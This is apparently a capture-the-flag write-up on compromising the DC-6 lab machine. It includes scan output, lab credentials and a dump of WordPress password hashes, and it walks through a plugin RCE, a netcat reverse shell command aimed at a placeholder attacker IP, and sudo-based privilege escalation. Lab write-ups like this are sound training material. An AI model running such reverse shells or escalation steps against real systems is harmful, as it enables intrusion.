# DC: 6
### Credentials
```
Wordpress:
mark / helpdesk01

Machine:
graham:GSo7isUM1D4

```
### Nmap Scan
```
Nmap scan report for dc-6 (192.168.1.26)
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Did not follow redirect to http://wordy/
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 08:00:27:3A:8C:A8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Recon
### Web Recon
* Server: Apache 2.4.45
* Tech Stack: PHP, Wordpress CMS (5.1.1), MySQL
### WPScan
```
[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'


[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 ```
 ## Machine Enumeration
 ### wpconfig.php
 ```
 define('WP_HOME','http://wordy');
define('WP_SITEURL','http://wordy');

define( 'DB_NAME', 'wordpressdb' );

/** MySQL database username */
define( 'DB_USER', 'wpdbuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'meErKatZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```
### MySQL Dump
```
| ID | user_login | user_pass                          | user_nicename | user_email                  | user_url | user_registered     | user_activation_key                           | user_status | display_name    |
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
|  1 | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         | blah@blahblahblah1.net.au   |          | 2019-04-24 12:52:10 |                                               |           0 | admin           |
|  2 | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        | graham@blahblahblah1.net.au |          | 2019-04-24 12:54:57 |                                               |           0 | Graham Bond     |
|  3 | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          | mark@blahblahblah1.net.au   |          | 2019-04-24 12:55:39 |                                               |           0 | Mark Jones      |
|  4 | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ | sarah         | sarah@blahblahblah1.net.au  |          | 2019-04-24 12:56:10 |                                               |           0 | Sarah Balin     |
|  5 | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          | jens@blahblahblah1.net.au   |          | 2019-04-24 13:04:40 | 1556111080:$P$B5/.DwEMzMFh3bvoGjPgnFO0Qtd3p./ |           0 | Jens Dagmeister |
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
 ```
## Getting a foothold
When logging in to the dashboard with found credentials we can see nothing special, I cannot upload plugins, change themes, add pages, etc. But I saw an interesting plugin named Activity Monitor which was vulnerable to an authenticated RCE vulnerability.
Using the exploit I get a limited shell, so I can use netcat to open another reverse shell and stabilise it.
```
nc -e /bin/bash <YOUR_IP> <YOUR_PORT>
```
And on my machine I opened a listener on the specified port.

### Movement inside the machine
Since the target is a wordpress site once in the machine i looked through the wp-config.php file which contained MySQL credentials. I was able to dump all the users from the database along with their hashed passwords which I was not able to crack.
Moving on, I found plain text credentials written in a to-do list which I used to move to the user “graham”.
Now as graham using “sudo -l” I see that I can run a file as the user “jens”. The vulnerability was that, that I had write permissions to the script run as jens, so I could just append /bin/bash and execute it as “jens” and get a shell as jens.

### Privilege Escalation
As user jens running “sudo -l” returns that I can run nmap without the use of a password. A search on gtfobins gives me a string of commands that when executed give me root shell.

## Notes
**Always** check for permissions on files run either by root or another higher level user. If I can append something to scripts that are ran as other users then the vulnerability exists.
* Pay attention to the language used in the script, I mean you can’t just append a bash command to a python script that easy or vice versa
